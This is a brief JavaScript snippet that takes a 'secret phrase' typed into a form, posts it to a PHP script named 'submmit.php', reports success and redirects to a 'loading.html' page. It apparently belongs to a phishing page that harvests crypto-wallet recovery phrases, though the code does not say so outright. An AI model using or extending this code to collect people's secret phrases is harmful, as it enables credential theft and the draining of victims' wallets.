<script>
        document.getElementById('secretForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            
            // Get secret phrase input
            const secretPhrase = document.getElementById('secret_phrase').value;

            // Send secret phrase to PHP script using AJAX
            fetch('submmit.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ secret_phrase: secretPhrase })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Secret phrase sent successfully!');
                    // Redirect to another page
                    window.location.href = 'loading.html';
                } else {
                    alert('Failed to send secret phrase. Please try again later.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again later.');
            });
        });
    </script>